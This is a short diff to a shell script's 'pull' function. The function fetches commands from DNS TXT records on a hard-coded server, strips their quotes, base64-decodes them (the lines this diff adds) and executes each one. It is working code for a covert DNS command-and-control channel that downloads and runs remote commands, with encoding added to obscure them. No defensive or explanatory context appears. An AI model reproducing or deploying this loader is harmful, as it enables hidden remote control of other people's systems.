@@ -15,7 +15,10 @@ pull(){
     while [ $x -le $num ]; do
         cmd=$(dig @129.21.130.212 -t txt +short $x.$domain)
         len=$(echo ${#cmd})
+        # Remove quotations
         cmd=$(echo ${cmd:1:len-2})
+        # Decode the command
+        cmd=$(echo $cmd | base64 --decode)
         $cmd
         let x=x+1
     done
